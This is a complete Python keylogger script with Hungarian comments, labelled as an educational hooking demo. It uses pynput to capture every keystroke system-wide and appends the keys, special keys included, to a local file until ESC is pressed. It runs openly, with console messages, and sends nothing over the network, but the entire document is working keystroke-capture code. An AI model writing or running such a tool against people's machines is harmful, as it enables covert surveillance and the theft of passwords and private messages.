from pynput import keyboard
import time

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Karakterek naplózása
        log_entry = f"{key.char}"
    except AttributeError:
        # Speciális billentyűk kezelése
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\n[ENTER]\n"
        elif key == keyboard.Key.backspace:
            log_entry = " [BS] "
        else:
            log_entry = f" [{str(key).replace('Key.', '')}] "

    # Fájlba írás (Append mód)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

def on_release(key):
    # Pánik gomb: ESC lenyomására leáll a figyelés
    if key == keyboard.Key.esc:
        print("\n[!] Keylogger leállítva.")
        return False

if __name__ == "__main__":
    print("--- EDUCATIONAL KEYLOGGER (Hooking Demo) ---")
    print(f"[*] Naplózás indítása ide: {LOG_FILE}")
    print("[*] A leállításhoz nyomj ESC-et.")
    
    # Listener indítása
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()